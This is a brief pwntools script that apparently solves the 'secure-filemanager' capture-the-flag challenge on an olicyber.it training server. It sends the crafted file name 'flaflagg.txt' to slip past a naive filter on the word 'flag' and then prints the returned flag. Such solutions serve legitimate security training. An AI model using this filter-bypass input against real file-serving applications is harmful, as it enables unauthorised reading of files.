from pwn import *

HOST = 'secure-filemanager.challs.olicyber.it'
PORT = 38104

r = remote(HOST, PORT)

x = r.recvuntil(b'Read file: ')
r.sendline(b'flaflagg.txt')
x = r.recvuntil(b'}').decode().replace('\n', '')
print(x)

